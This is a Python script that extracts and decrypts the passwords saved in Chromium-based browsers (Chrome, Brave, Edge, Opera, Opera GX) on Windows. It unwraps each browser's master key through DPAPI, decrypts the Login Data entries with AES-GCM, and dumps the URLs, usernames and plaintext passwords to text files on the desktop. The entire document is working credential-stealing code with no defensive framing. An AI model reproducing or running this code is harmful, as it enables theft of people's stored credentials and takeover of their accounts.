import sqlite3
import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
import win32crypt
from Crypto.Cipher import AES
import ctypes
import time

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browser_loc = {
    "Chrome": f"{local}/Google/Chrome",
    "Brave": f"{local}/BraveSoftware/Brave-Browser",
    "Edge": f"{local}/Microsoft/Edge",
    "Opera": f"{roaming}/Opera Software/Opera Stable",
    "OperaGX": f"{roaming}/Opera Software/Opera GX Stable",
}

def get_desktop_path():
    csidl_desktop = 0x0010
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(0, csidl_desktop, 0, 0, buf)
    return buf.value

OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), f"extracao_{os.getlogin()}.txt")

filePass = os.path.join(get_desktop_path(), f"passes_{os.getlogin()}.txt")
fileInfo = os.path.join(get_desktop_path(), f"info_{os.getlogin()}.txt")

for i in os.listdir(browser_loc['Chrome'] + "/User Data"):
    if i.startswith("Profile "):
        browser_loc["ChromeP"] = f"{local}/Google/Chrome/User Data/{i}"

def copy_file_with_retry(src, dst, retries=5, delay=1):
    for attempt in range(retries):
        try:
            copy2(src, dst)
            return True
        except PermissionError:
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                return False

def decrypt_browser(LocalState, LoginData, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = loads(f.read())
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            if copy_file_with_retry(LoginData, "TempMan.db"):
                with connect("TempMan.db") as conn:
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    with open(filePass, "a") as f:
                        f.write(f"*** {name} ***\n")
                    for logins in cur.fetchall():
                        try:
                            if not logins[0] or not logins[1] or not logins[2]:
                                continue
                            ciphers = logins[2]
                            init_vector = ciphers[3:15]
                            enc_pass = ciphers[15:-16]
                            cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                            dec_pass = cipher.decrypt(enc_pass).decode()
                            to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                            with open(filePass, "a") as f:
                                f.write(to_print)
                        except (Exception, FileNotFoundError):
                            pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"{name} Arquivo Login Data nao encontrado\n")
    else:
        with open(fileInfo, "a") as f:
            f.write(f"{name} Arquivo Local State nao encontrado\n")

def Local_State(path):
    return f"{path}/User Data/Local State"

def Login_Data(path):
    if "Profile" in path:
        return f"{path}/Login Data"
    else:
        return f"{path}/User Data/Default/Login Data"

def file_handler(file):
    if os.path.exists(file):
        try:
            with open(OUTPUT_FILE_PATH, "a", encoding="utf-8") as f_out:  
                with open(file, "r", encoding="utf-8", errors="ignore") as f_in: 
                    f_out.write(f_in.read())
        except UnicodeDecodeError as e:
            with open(OUTPUT_FILE_PATH, "a") as f_out:
                f_out.write(f"\nErro ao processar o arquivo {file}: {str(e)}\n")
        finally:
            os.remove(file)

for_handler = (
    fileInfo,
    filePass
)

def main():
    for name, path in browser_loc.items():
        decrypt_browser(Local_State(path), Login_Data(path), name)
    for i in for_handler:
        file_handler(i)

main()
